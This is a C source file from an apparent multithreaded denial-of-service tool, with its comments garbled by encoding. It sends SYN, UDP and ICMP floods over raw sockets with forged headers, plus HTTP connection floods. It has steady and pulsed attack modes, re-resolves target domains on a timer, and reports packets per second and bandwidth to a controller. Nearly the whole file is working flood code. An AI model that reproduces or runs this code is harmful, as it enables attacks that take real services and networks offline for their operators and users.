/********************************************************************************/
/* ʵʩ��������                                                                 */
/********************************************************************************/

#include "attack.h"
#include "xmlctr.h"
#include "dataList.h"
#include "package.h"
#include "globalData.h"
#include "sendResultFile.h"

static float attackTimeRealgo;//ȫ�ֱ���:ʵ�ʹ�����ʱ�䣬��Ҫ���ڷ��Ͱ�������趨����ʱ����ʱ��ʱ��ͳ��
static ddosConfig * ddosc;
static unsigned long pthread_send_package_num[MAX_PTHREAD_NUM];//ÿ���̷߳��͵İ���,���������Խ������
static unsigned long pthread_send_package_byte[MAX_PTHREAD_NUM];
extern int pthread_shutdown;
/********************************************************************************/
/* ���������������Լ��                                                       */
/********************************************************************************/
int getcd(int n,int m)
{
    int t,r;
    int result;
    if(n==0||m==0){//���������һ����Ϊ0���򷵻������еĴ���
        if(n>=m)
            result = n;
        else
            result = m;
    } 
    else{//��������Ϊ0
        if(n<m){
            t=n;
            n=m;
            m=t;
        }
        while(m!=0){
            r=n%m;
            n=m;
            m=r;
        }
        result = n;
    }
    return result;
}
/********************************************************************************/
/* д�����ݵ��ļ���                                                             */
/********************************************************************************/
int writeToFile(char * LineContent)
{
    //������ļ�
    FILE * fp;
	fp = fopen("attackResult.txt","a");
    if(fp == NULL){
        printf("X Error: File:attackResult.txt Can Not Open To Write\n");
        return 0;
    }
	fprintf(fp,"%s\r\n",LineContent);
    fclose(fp);
	return 1;
}
/********************************************************************************/
/* д�ַ���ָ���ļ�                                                             */
/* �������:�ַ�,Ҫд����ļ�                                                   */
/********************************************************************************/
int writechartofile(int s,char *filename)
{
    FILE *fp;
    if((fp=fopen(filename,"w"))==NULL){
        printf("can't open file.");
        return 0;
    }
    fprintf(fp,"%d",s);
    fclose(fp);
    return 1;
}
/********************************************************************************/
/* ��һģʽ��ÿ�������̵߳�ִ��                                                 */
/********************************************************************************/
void *newppthread_signal(void *attackM)
{
	char * datap;
	int attackIpLinklength,attackPortLinkLength;
	attackIpLinklength = getLinkLength_arr(ddosc->ipls);
	attackPortLinkLength = getLinkLength_arr(ddosc->portls);
    int packetLen;//���Ͱ��İ���
    struct sockaddr_in sin;
    int sockfd,foo,ret;
    struct attackM_st *attDT = (struct  attackM_st *)attackM;
	//printf("_attackIp:%s\n",attDT->attackIp);
    //printf("_attackPort:%s\n",attDT->attackPort);
	//printf("____pthread_id:%d\n",attDT->pthread_id);
    int attackStyleNum=0;//�������ͱ��
    //�ж����������͵Ĺ���
    if(ddosc->synStyle!=NULL){//synflood
        attackStyleNum = 1;
		printf("* pthread%d:tcpflood\n",attDT->pthread_id);
	}
    else if(ddosc->udpStyle!=NULL){//udpflood
        attackStyleNum = 2;
		printf("* pthread%d:udpflood\n",attDT->pthread_id);
	}
    else if(ddosc->icmpStyle!=NULL){//icmpflood
        attackStyleNum = 3;
		printf("* pthread%d:icmpflood\n",attDT->pthread_id);
	}
    else if(ddosc->httpStyle!=NULL){//httpflood
        attackStyleNum = 4;
		printf("* pthread%d:httpflood\n",attDT->pthread_id);
	}
	if(attackStyleNum==1){
		if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		packetLen=ddosc->synStyle->packetLength;
	}
	else if(attackStyleNum==2){
		if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_UDP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		packetLen = ddosc->udpStyle->packetLength;
	}
	else if(attackStyleNum==3){
		if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		packetLen = ddosc->icmpStyle->packetLength;
	}
	else
		packetLen=ddosc->httpStyle->packetLength;
    if(attackStyleNum!=4) { //����http
        foo=1;
        if( (setsockopt(sockfd, 0, IP_HDRINCL, (char *)&foo, sizeof(int)))==-1 ){
            printf("could not set raw header on socket\n");
            exit(1);
        }
    }
    //��÷��Ͱ����빥��ʱ��,�˴������빥��ʱ�佫����ì�ܣ������Ϊ����
    int sendPacketNumber;//��Ҫ���͵���С����
    double attackTime;//��Ϊ��λ
    sendPacketNumber = ddosc->sendPacketNumber;
    attackTime = ddosc->attackTime;//�õ������ʱ�䣬�԰����֮��ķ������ݼ�����п���
    int tempTime;//��õļ��ʱ��
    struct timeval t_start;//start time when send starts
    struct timeval t_end;//end time when one send over
    float sendedtime=0;//�ѹ���ʱ��
    float tempfloattime;
	int pulseyn = ddosc->pulseyn;//���ȼ���Ƿ�Ϊ��������
	sin.sin_family=AF_INET;
	if((sin.sin_port=htons(atoi(attDT->attackPort)))==0){
		printf("unknown port.\n");
		return NULL;
	}
    gettimeofday(&t_start,NULL);

    
    //���ʱ�䣬ȷ���Ƿ���Ҫ���»�ȡĿ��IP
    time_t t_c_start;//start time when send starts
    time_t t_c_end;//end time when one send over
    char oldip[40];
    char newip[40]; 

    strcpy(oldip,attDT->attackIp);
    sin.sin_addr.s_addr =inet_addr(attDT->attackIp);    
    t_c_start = time(0);
    
	if(pulseyn==1){//���ȹ���
		if(attackStyleNum!=4)
		{//����http
			while( !pthread_shutdown&&
			    (pthread_send_package_num[attDT->pthread_id]<sendPacketNumber||sendedtime<attackTime)
			)
			{
                if(ddosc->src_type==1 && ddosc->getip_time )//type=domain and time!=0
                {                
                    t_c_end = time(0);
                    if( t_c_end-t_c_start > ddosc->getip_time )
                    {
                        ret = req_fir_domain_ip(newip,ddosc->src_domain,oldip);
                        if(ret==1)
                        {
                            strcpy(oldip,newip);
                            sin.sin_addr.s_addr =inet_addr(oldip);
                        }
                        t_c_start = time(0);
                    }
                }
			
                //���
				if(attackStyleNum==1) { //���tcpflood������
					datap = ip_tcp_package(ddosc->synStyle,oldip,attDT->attackPort);
				}
				else if(attackStyleNum==2) { //udp������
					datap = ip_udp_package(ddosc->udpStyle,oldip,attDT->attackPort);
				}
				else if(attackStyleNum==3) { //icmp������
					datap = ip_icmp_package(ddosc->icmpStyle,oldip,attDT->attackPort);
				}
				if(sendto(sockfd,datap,packetLen,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
					perror("X Error:send package wrong.");
					//exit(1);
					continue;
				}
				pthread_send_package_num[attDT->pthread_id]++;
				//�������
				tempTime = getSleepTime(ddosc->packetTimels);
				//printf("sleepTime:%d;",tempTime);
				if(tempTime!=0)
					usleep(tempTime);
				gettimeofday(&t_end,NULL);
				tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);
				sendedtime = tempfloattime/1000000;
			}
			close(sockfd);
		}
		else if(attackStyleNum==4) { //����http������
			while(!pthread_shutdown&&(pthread_send_package_num[attDT->pthread_id]<sendPacketNumber||sendedtime<attackTime)){
				if((sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1){
					perror("socket wrong!");
					exit(1);    
				}
				ret = connect(sockfd,(struct sockaddr *)&sin,sizeof(sin));
				if(ret)
				    printf("failed to connect to %s.\n",attDT->attackIp);
				else{
					datap = http_package(ddosc->httpStyle);
					ret = write(sockfd,datap,packetLen-40);
				}
				pthread_send_package_num[attDT->pthread_id]++;
				//�������
				tempTime = getSleepTime(ddosc->packetTimels);
				if(tempTime!=0)
					usleep(tempTime);
				
				gettimeofday(&t_end,NULL);
				tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);
				sendedtime = tempfloattime/1000000;
				close(sockfd);
			}
		}
		//�����̹߳���ʱ����ڴ�ʱ��ʵ�ʹ���ʱ��ʱ������ĸ���ʵ�ʹ���ʱ��
		if(sendedtime>attackTimeRealgo){
			attackTimeRealgo = sendedtime;
		}
	}
	else{//��������
		int cycleTime = ddosc->cycleTime;//����ʱ��(s)
		int pulseTime = ddosc->pulseTime;//������������ʱ��(s)
		int speed = ddosc->speed;//��������(��/s)
		int sendedpulsenum;//�������������з��͵İ���
		int pulseNum = attackTime/cycleTime ;//������
		int ipulse; 
		struct timeval t_pulse_start;//start pulse time when send starts
		struct timeval t_pulse_end;//end pulse time when send starts
		float sendedpulsetime;//��pulse��ʱ��(s)
		int sleepTime = (cycleTime-pulseTime)*1000000;//΢�뼶��
		int sPackageTime = 1000000/speed-getOnePackageTime;//��1����ʱ��΢��,��ǰĬ����֯һ�����ݰ���ƽ��ʱ��Ϊ70us
		if(sPackageTime<0)
			sPackageTime=0;
		int sendallpacnum;//ÿ�����巢�͵İ��� 
		sendallpacnum = pulseTime*speed;
		if(attackStyleNum!=4){//����http
			for(ipulse=0;ipulse<pulseNum;ipulse++){
				gettimeofday(&t_pulse_start,NULL);
				sendedpulsetime=0;
				sendedpulsenum=0;
				while(!pthread_shutdown&&sendedpulsenum<sendallpacnum&&sendedpulsetime<pulseTime)
				{
                    if(ddosc->src_type==1 && ddosc->getip_time)
                    {                
                        t_c_end = time(0);
                        if( t_c_end-t_c_start > ddosc->getip_time )
                        {
                            ret = req_fir_domain_ip(newip,ddosc->src_domain,oldip);
                            if(ret==1)
                            {
                                strcpy(oldip,newip);
                                sin.sin_addr.s_addr =inet_addr(oldip);
                            }
                            t_c_start = time(0);
                        }
                    }
				    
					//���
					if(attackStyleNum==1) { //���tcpflood������
						//packetLen=ddosc->synStyle.packetLength;
						datap = ip_tcp_package(ddosc->synStyle,attDT->attackIp,attDT->attackPort);
					}
					else if(attackStyleNum==2) { //udp������
						//packetLen = ddosc->udpStyle.packetLength;
						datap = ip_udp_package(ddosc->udpStyle,attDT->attackIp,attDT->attackPort);
					}
					else if(attackStyleNum==3) { //icmp������
						//packetLen = ddosc->icmpStyle->packetLength;
						datap = ip_icmp_package(ddosc->icmpStyle,attDT->attackIp,attDT->attackPort);
					}
					//�������ݰ�
					if(sendto(sockfd,datap,packetLen,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
						perror("send wrong!");
						//exit(1);
						continue;
					}
					sendedpulsenum++;
					pthread_send_package_num[attDT->pthread_id]++;
					usleep(sPackageTime);
					gettimeofday(&t_pulse_end,NULL);
					tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);  
					sendedpulsetime =tempfloattime/1000000;//s
					//printf("sendpulsetime:%f\n",sendedpulsetime);
				}
				usleep(sleepTime);
			}
			close(sockfd);
		}
		else if(attackStyleNum==4) { //����http������
			for(ipulse=0;ipulse<pulseNum;ipulse++){
				gettimeofday(&t_pulse_start,NULL);
				sendedpulsetime=0;
				sendedpulsenum=0;
				while(!pthread_shutdown&&pthread_send_package_num[attDT->pthread_id]<pulseTime*speed&&sendedpulsetime<pulseTime){
					if((sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1){
						perror("socket wrong!");
						exit(1);
					}
					ret = connect(sockfd,(struct sockaddr *)&sin,sizeof(sin));
					if(ret){
						printf("failed to connect to %s.\n",attDT->attackIp);
					}
					else {
						//packetLen=ddosc->httpStyle->packetLength;
						datap = http_package(ddosc->httpStyle);
						ret = write(sockfd,datap,packetLen-40);
					}
					pthread_send_package_num[attDT->pthread_id]++;
					sendedpulsenum++;
					usleep(sPackageTime);
					gettimeofday(&t_pulse_end,NULL);
					tempfloattime = 1000000*(t_pulse_end.tv_sec-t_pulse_start.tv_sec)+(t_pulse_end.tv_usec-t_pulse_start.tv_usec);  
					sendedpulsetime =tempfloattime/1000000;//s
					close(sockfd);
				}
				usleep(sleepTime);
			}
		}
	}
	pthread_send_package_byte[attDT->pthread_id] = packetLen*pthread_send_package_num[attDT->pthread_id];
	if(attDT)
		free(attDT);
	return NULL;
}
/********************************************************************************/
/* ���ģʽ�������̵߳�ִ��                                                     */
/********************************************************************************/
void *newppthread_fixed(void *attackM)
{
    int attackIpLinklength,attackPortLinkLength;
    attackIpLinklength = getLinkLength_arr(ddosc->ipls);
    attackPortLinkLength = getLinkLength_arr(ddosc->portls);
    struct sockaddr_in sin;
    int sockfd,sockfd_http,sockfd_tcp,sockfd_udp,sockfd_icmp;
    struct attackM_st *attDT = (struct  attackM_st *)attackM;
    int ret,foo=1;
    char * datap;

    //����socket
    if((sockfd=socket(AF_INET,SOCK_RAW,255)) == -1){
        perror("socket wrong!");
        exit(1);
    }
    int sendPacketNumber;
    double attackTime;//��Ϊ��λ
    sendPacketNumber = ddosc->sendPacketNumber;
    attackTime = ddosc->attackTime;
    //�õ������ʱ�䣬�԰����֮��ķ������ݼ�����п���
    int sendednum=0;//�ѷ��Ͱ���
    int sendnum_syn=0,sendnum_icmp=0,sendnum_udp=0,sendnum_http=0;//��Ҫ���͵�4�����͵İ���
    int i_syn,i_icmp,i_udp,i_http;//ÿ������˳�η��͵�4�����͵İ���
    int sum_syn=0,sum_icmp=0,sum_udp=0,sum_http=0;//�������ۼƷ��͵İ���
    int paclen_syn=0,paclen_icmp=0,paclen_udp=0,paclen_http=0;//�����Ͱ��İ���
    int maxcd=1;//4�������Լ��
    int i;//�ۼӼ���
    int tempTime;//��õļ��ʱ��
    struct timeval t_start;//start time when send starts
    struct timeval t_end;//end time when one send over
    float sendedtime=0;//�ѹ���ʱ��
    float tempfloattime;
    int packNum;//���ȹ���������������Ҫ����ͳ�Ƶı���������ͬ
	//���ȼ���Ƿ�Ϊ��������
	int pulseyn = ddosc->pulseyn;
	if(pulseyn==1)
		packNum = ddosc->sendPacketNumber;
	else
		packNum = ddosc->speed;//����������ÿ�뷢�͵İ�����Ϊͳ�Ʊ���
    //�õ���style������Ŀ    
    if(ddosc->synStyle!=NULL){//��Ҫ����syn��
        sendnum_syn=ddosc->synStyle->percentage*packNum;
        maxcd = getcd(getcd(getcd(sendnum_syn,sendnum_icmp),sendnum_udp),sendnum_http);//�õ�4�����Ͱ����Ĺ�Լ��
        paclen_syn = ddosc->synStyle->packetLength;
        //printf("maxcd:%d\n",maxcd);
		if((sockfd_tcp=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		if( (setsockopt(sockfd_tcp, 0, IP_HDRINCL, (char *)&foo, sizeof(int)))==-1 ){
            printf("could not set raw header on socket\n");
            exit(1);
        }
    }
    if(ddosc->udpStyle!=NULL){//��Ҫ����udp��
        sendnum_udp=ddosc->udpStyle->percentage*packNum;
        maxcd = getcd(getcd(getcd(sendnum_syn,sendnum_icmp),sendnum_udp),sendnum_http);//�õ�4�����Ͱ����Ĺ�Լ��
        paclen_udp = ddosc->udpStyle->packetLength;
        //printf("maxcd:%d\n",maxcd);
		if((sockfd_udp=socket(AF_INET,SOCK_RAW,IPPROTO_UDP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		if( (setsockopt(sockfd_udp, 0, IP_HDRINCL, (char *)&foo, sizeof(int)))==-1 ){
            printf("could not set raw header on socket\n");
            exit(1);
        }
    }
    if(ddosc->icmpStyle!=NULL){//��Ҫ����icmp��
        sendnum_icmp=ddosc->icmpStyle->percentage*packNum;
        maxcd = getcd(getcd(getcd(sendnum_syn,sendnum_icmp),sendnum_udp),sendnum_http);//�õ�4�����Ͱ����Ĺ�Լ��
        paclen_icmp = ddosc->icmpStyle->packetLength;
        //printf("maxcd:%d\n",maxcd);
		if((sockfd_icmp=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		if( (setsockopt(sockfd_icmp, 0, IP_HDRINCL, (char *)&foo, sizeof(int)))==-1 ){
            printf("could not set raw header on socket\n");
            exit(1);
        }
    }
    if(ddosc->httpStyle!=NULL){//��Ҫ����http��,��Ҫ����socket��
        sendnum_http=ddosc->httpStyle->percentage*packNum;
        maxcd = getcd(getcd(getcd(sendnum_syn,sendnum_icmp),sendnum_udp),sendnum_http);//�õ�4�����Ͱ����Ĺ�Լ��
        paclen_http = ddosc->httpStyle->packetLength;
        //printf("maxcd:%d\n",maxcd);
    }
    //�õ�ÿ�η��͵ĸ����Ͱ�������
    i_syn = sendnum_syn/maxcd;
    i_icmp = sendnum_icmp/maxcd;
    i_udp = sendnum_udp/maxcd;
    i_http = sendnum_http/maxcd;

	sin.sin_family=AF_INET;
	if((sin.sin_port=htons(atoi(attDT->attackPort)))==0){
		printf("unknown port.\n");
		return NULL;
	}
	sin.sin_addr.s_addr =inet_addr(attDT->attackIp);
	gettimeofday(&t_start,NULL);//��ʼ��ʱ
	if(pulseyn==1){ //���ȹ���
		while(!pthread_shutdown&&(sendednum<sendPacketNumber||sendedtime<attackTime)){
			for(i=0;i<i_syn;i++){//syn��
				//���
				datap = ip_tcp_package(ddosc->synStyle,attDT->attackIp,attDT->attackPort);
				//���Ͱ�
				if(sendto(sockfd_tcp,datap,ddosc->synStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
					perror("send wrong!");
					//exit(1);
					continue;
				}
				sendednum++;
				sum_syn++;
				pthread_send_package_num[attDT->pthread_id]++;
				//�������
				tempTime = getSleepTime(ddosc->packetTimels);
				printf("sleepTime:%d\n",tempTime);
				if(tempTime!=0){
					usleep(tempTime);
				}
			}
			for(i=0;i<i_icmp;i++){
				//���
				datap = ip_icmp_package(ddosc->icmpStyle,attDT->attackIp,attDT->attackPort);
				//���Ͱ�
				if(sendto(sockfd_icmp,datap,ddosc->icmpStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
					perror("send wrong!");
					//exit(1);
					continue;
				}
				sendednum++;
				sum_icmp++;
				pthread_send_package_num[attDT->pthread_id]++;
				//�������
				tempTime = getSleepTime(ddosc->packetTimels);
				if(tempTime!=0){
					usleep(tempTime);
				}
			}
			for(i=0;i<i_udp;i++){
				//���
				datap = ip_udp_package(ddosc->udpStyle,attDT->attackIp,attDT->attackPort);
				//���Ͱ�
				if(sendto(sockfd_udp,datap,ddosc->udpStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
					perror("send wrong!");
					//exit(1);
					continue;
				}
				sendednum++;
				sum_udp++;
				pthread_send_package_num[attDT->pthread_id]++;
				tempTime = getSleepTime(ddosc->packetTimels);//�������
				printf("sleepTime:%d\n",tempTime);
				if(tempTime!=0){
					usleep(tempTime);
				}
			}
			for(i=0;i<i_http;i++){
				//http�������ݰ�����
				//����socket
				if((sockfd_http=socket(AF_INET,SOCK_STREAM,0)) == -1){
					perror("socket wrong!");
					exit(1);    
				}
				ret = connect(sockfd_http,(struct sockaddr *)&sin,sizeof(sin));
				/*if(ret){
					printf("failed to connect to server.\n");
					return;
				}*/
				if(ret==0){
					datap = http_package(ddosc->httpStyle);
					ret = write(sockfd,datap,ddosc->httpStyle->packetLength-40);
					sendednum++;
					sum_http++;
					pthread_send_package_num[attDT->pthread_id]++;
					if(tempTime!=0)
						usleep(tempTime);//�������
					close(sockfd_http);
				}
			}
			gettimeofday(&t_end,NULL);
			tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);
			sendedtime =tempfloattime/1000000;
		}
		close(sockfd_tcp);
		close(sockfd_udp);
		close(sockfd_icmp);
		//�����̹߳���ʱ����ڴ�ʱ��ʵ�ʹ���ʱ��ʱ������ĸ���ʵ�ʹ���ʱ��
		if(sendedtime>attackTimeRealgo){
			attackTimeRealgo = sendedtime;
		}
	}
	else { //��������
		int cycleTime = ddosc->cycleTime;//����ʱ��(s)
		int pulseTime = ddosc->pulseTime;//������������ʱ��(s)
		int speed = ddosc->speed;//��������(��/s)
		int sendedpulsenum; 
		int pulseNum = attackTime/cycleTime;//������ 
		int ipulse;
		struct timeval t_pulse_start;//start pulse time when send starts
		struct timeval t_pulse_end;//end pulse time when send starts
		float sendedpulsetime;//��pulse��ʱ��s
		//cycleTime>pulseTime,�˴�������֤
		int sleepTime = (cycleTime-pulseTime)*1000000;//΢���
		int sPackageTime = 1000000/speed-getOnePackageTime;//��1����ʱ��,΢���
		if(sPackageTime<0)
			sPackageTime=0;
		for(ipulse=0;ipulse<pulseNum;ipulse++){   
			gettimeofday(&t_pulse_start,NULL);
			sendedpulsetime=0;
			sendedpulsenum=0;
			while(!pthread_shutdown&&sendedpulsenum<pulseTime*speed&&sendedpulsetime<pulseTime){//ÿ����ѭ��
				for(i=0;i<i_syn;i++){//syn��
					//���
					datap = ip_tcp_package(ddosc->synStyle,attDT->attackIp,attDT->attackPort);
					//���Ͱ�
					if(sendto(sockfd_tcp,datap,ddosc->synStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
						perror("send wrong!");
						//exit(1);
						continue;
					}
					sendednum++;
					sum_syn++;
					sendedpulsenum++;
					pthread_send_package_num[attDT->pthread_id]++;
					usleep(sPackageTime);
				}
				for(i=0;i<i_icmp;i++){
					//���
					datap = ip_icmp_package(ddosc->icmpStyle,attDT->attackIp,attDT->attackPort);
					//���Ͱ�
					if(sendto(sockfd,datap,ddosc->icmpStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
						perror("send wrong!");
						//exit(1);
						continue;
					}
					sendednum++;
					sum_icmp++;
					sendedpulsenum++;
					pthread_send_package_num[attDT->pthread_id]++;
					usleep(sPackageTime);
				}
				for(i=0;i<i_udp;i++){
					//���
					datap = ip_udp_package(ddosc->udpStyle,attDT->attackIp,attDT->attackPort);
					//���Ͱ�
					if(sendto(sockfd,datap,ddosc->udpStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
						perror("send wrong!");
						//exit(1);
						continue;
					}
					sendednum++;
					sum_udp++;
					sendedpulsenum++;
					pthread_send_package_num[attDT->pthread_id]++;
					usleep(sPackageTime);
				}
				for(i=0;i<i_http;i++){
					//http�������ݰ�����
					//����socket
					if((sockfd_http=socket(AF_INET,SOCK_STREAM,0)) == -1){
						perror("socket wrong!");
						exit(1);
						
					}
					ret = connect(sockfd_http,(struct sockaddr *)&sin,sizeof(sin));
					/*if(ret){
						printf("failed to connect to server.\n");
						return;			
					}*/
					//printf("httpflood::");
					//printf("packetlength:%d\n",ddosc->httpStyle->packetLength);
					if(ret==0){
						datap = http_package(ddosc->httpStyle);
						ret = write(sockfd,datap,ddosc->httpStyle->packetLength-40);
						sendednum++;
						sum_http++;
						sendedpulsenum++;
						pthread_send_package_num[attDT->pthread_id]++;
						close(sockfd_http);
						usleep(sPackageTime);
					}
				}
				gettimeofday(&t_pulse_end,NULL);
				tempfloattime = 1000000*(t_pulse_end.tv_sec-t_pulse_start.tv_sec)+(t_pulse_end.tv_usec-t_pulse_start.tv_usec);
				sendedpulsetime =tempfloattime/1000000;//us
			}
			usleep(sleepTime);
		}
		close(sockfd);
	}
	//���㷢��������
    pthread_send_package_byte[attDT->pthread_id] += sendnum_syn*paclen_syn + sendnum_udp*paclen_udp + sendnum_icmp*paclen_icmp + sendnum_http*paclen_http;
	if(attDT)
		free(attDT);
	return NULL;
}
/********************************************************************************/
/* ����ÿ��ip��ĳ��port,��ָ�����ݵĹ����߳�                                    */
/********************************************************************************/
void *newthread(struct attackM_st *attackM_t)
{
    int i,err;
    pthread_t ppid[MAX_PTHREAD_NUM];
    int threadNumber = ddosc->startThreadNumber;//�����߳���
    if(ddosc->mode==1){
        for(i=0;i<threadNumber;i++){
			struct attackM_st * attackM;
			attackM = (struct attackM_st *)malloc(sizeof(struct attackM_st));
			memset(attackM,0,sizeof(struct attackM_st));
			attackM->attackIp = attackM_t->attackIp;
			attackM->attackPort = attackM_t->attackPort;
			attackM->pthread_id = i;
            err=pthread_create(&ppid[i],NULL,newppthread_signal,(void *)attackM);//������ģʽ�������߳�
            if(err!=0){
                printf("create pthread error!\n");
                exit(1);
        	}
        }
		for(i=0;i<threadNumber;i++)
			pthread_join(ppid[i],NULL);
    }
    else {
        for(i=0;i<threadNumber;i++){
			struct attackM_st * attackM;
			attackM = (struct attackM_st *)malloc(sizeof(struct attackM_st));
			memset(attackM,0,sizeof(struct attackM_st));
			attackM->attackIp = attackM_t->attackIp;
			attackM->attackPort = attackM_t->attackPort;
			attackM->pthread_id = i;
            err=pthread_create(&ppid[i],NULL,newppthread_fixed,(void *)&attackM);//������Ϲ������߳�
            if(err!=0){
                printf("create pthread error!\n");
                exit(1);
        	}
        }
		for(i=0;i<threadNumber;i++)
			pthread_join(ppid[i],NULL);
    }
	return NULL;
}
/********************************************************************************/
/* ��ø��̷߳��Ͱ���֮��                                                       */
/* ����:�����ܺ�                                                                */
/********************************************************************************/
unsigned long getSendPackageNum()
{
	int i;
	unsigned long sum=0;
	char lineContentTemp[MAXSIZE];
	int threadNumber = ddosc->startThreadNumber;//�����߳���
	for(i=0;i<threadNumber;i++){
		/* output*******************************/
		printf("* pthread%d:send package num:%ld\n",i,pthread_send_package_num[i]);
		bzero(lineContentTemp,MAXSIZE);
        sprintf(lineContentTemp,
				"* pthread%d:send package num:%ld<br>\n",
				i,pthread_send_package_num[i]);
        writeToFile(lineContentTemp);
		sum += pthread_send_package_num[i];
		/***************************************/
	}
	return sum;
}
/********************************************************************************/
/* ��ø��̷߳���Byte֮��                                                       */
/* ����:����Byte�ܺ�                                                            */
/********************************************************************************/
unsigned long getSendByte()
{
	int i;
	unsigned long sum=0;
	char lineContentTemp[MAXSIZE];
	int threadNumber = ddosc->startThreadNumber;//�����߳���
	for(i=0;i<threadNumber;i++){
		/* output*******************************/
		printf("* pthread%d:send byte:%ldB\n",i,pthread_send_package_byte[i]);
		bzero(lineContentTemp,MAXSIZE);
        sprintf(lineContentTemp,
				"* pthread%d:send byte:%ldB<br>\n",
				i,pthread_send_package_byte[i]);
        writeToFile(lineContentTemp);
		/***************************************/
		sum += pthread_send_package_byte[i];
	}
	return sum;
}
void clearSendDate()
{
	int i;
	for(i=0;i<MAX_PTHREAD_NUM;i++){
		pthread_send_package_num[i]=0;
		pthread_send_package_byte[i]=0;
	}
}
/********************************************************************************/
/* ��ʼ������������                                                             */
/* �������:xml�ļ���·��                                                       */
/********************************************************************************/
void *startAttack(void * docname)
{
	printf("Action: attack pthread created success.\n");
	attackTimeRealgo=0;
    struct attackM_st attackM;
    double bps,pps,doublepacknum;
	unsigned long sendpackagenumberall,send_all_byte;
	
    char lineContentTemp[MAXSIZE];
    FILE * fp = fopen("attackResult.txt","w");//������ļ����
    fclose(fp);
    ddosc = parseDoc(docname);//��xml�ж����ݣ�����ʽ��(��style���ݸ�ʽ��)
	if(ddosc==NULL){
		destroy_ddosConfig(ddosc);
		return NULL;
	}
	//outputList_arr(ddosc->ipls);
	//���Ҫ������ip�Լ�port�����ο��̹߳���
    int i,j;
    int attackIpLinklength,attackPortLinkLength;
    attackIpLinklength = getLinkLength_arr(ddosc->ipls);
    attackPortLinkLength = getLinkLength_arr(ddosc->portls);
    for(i=0;i<attackIpLinklength;i++){
        attackM.attackIp = getSomeone_arr(ddosc->ipls,i);
        for(j=0;j<attackPortLinkLength;j++){
			clearSendDate();
            attackM.attackPort = getSomeone_arr(ddosc->portls,j);
            /* output***************************************************/
			printf("******************************************\n");
            printf("* attack ip:%s,attack port:%s\n",attackM.attackIp,attackM.attackPort);
			printf("* ----------------------------------------\n");
			
            bzero(lineContentTemp,MAXSIZE);
            sprintf(lineContentTemp,
					"******************************************<br>\n* attackip:%s,attackport:%s<br>\n* ----------------------------------------------------------------<br>\n",
					attackM.attackIp,attackM.attackPort);
            writeToFile(lineContentTemp);
            /***********************************************************/
			newthread(&attackM);//˳�ι���ÿ��ipÿ���˿�
			sendpackagenumberall = getSendPackageNum();
			send_all_byte = getSendByte();
			/* output***************************************************/
			printf("* send all package number:%ld\n",sendpackagenumberall);
			printf("* send time(s):%.6fs\n",attackTimeRealgo);
            bzero(lineContentTemp,MAXSIZE);
            sprintf(lineContentTemp,
					"* send all package number:%ld<br>\n* send time(s):%.6fs<br>\n",
					sendpackagenumberall,attackTimeRealgo);
			writeToFile(lineContentTemp);
			/***********************************************************/
			doublepacknum = (double)sendpackagenumberall;
            if(ddosc->pulseyn==1) { //���ȹ���
                pps = doublepacknum/(attackTimeRealgo*1000);
                bps = ((double)send_all_byte*8)/(1024*1024*attackTimeRealgo);
				/* output***************************************************/
                printf("* pps:%.3fk/s\n",pps);
                printf("* bps:%.3fmb/s\n",bps);
                bzero(lineContentTemp,MAXSIZE);
                sprintf(lineContentTemp,
						"* pps:%.3fk/s<br>\n* bps:%.3fmb/s<br>\n******************************************<br>\n",
						pps,bps);
                writeToFile(lineContentTemp);
				/***********************************************************/
            }
            else{
                int realAttackTime = (ddosc->attackTime/ddosc->cycleTime)*ddosc->pulseTime;//�������������幥����ʱ��
                pps = doublepacknum/(realAttackTime*1000);
                bps = ((double)send_all_byte*8)/(1024*1024*realAttackTime);
                printf("* pps:%.3fk/s(only statistics data in pulse time)\n",pps);
                printf("* bps:%.3fmb/s(only statistics data in pulse time)\n",bps);
                printf("* total pps:%.3fk/s\n",doublepacknum/(ddosc->attackTime*1000));
                printf("* total bps:%.3fmb/s\n",((double)send_all_byte*8)/(ddosc->attackTime*1024*1024));
                bzero(lineContentTemp,MAXSIZE);
                sprintf(lineContentTemp,
						"* pps:%.3fk/s(only statistics data in pulse time)<br>\n* bps:%.3fmb/s(only statistics data in pulse time)<br>\n* total pps:%.3fk/s<br>\n* total bps:%.3fmb/s<br>\n******************************************<br>\n",
						pps,bps,doublepacknum/(ddosc->attackTime*1000),((double)send_all_byte*8)/(ddosc->attackTime*1024*1024));
                writeToFile(lineContentTemp);
            }
			printf("*******************************************\n");
        }
    }
	//destroy ddosc
	destroy_ddosConfig(ddosc);
	#ifndef DDOS_NO_CONTROL_ON
	if(sendResult()) //��������͵����ƶ�
		printf("send result fail!\n");
	#endif
	printf("\n");
	return NULL;
}

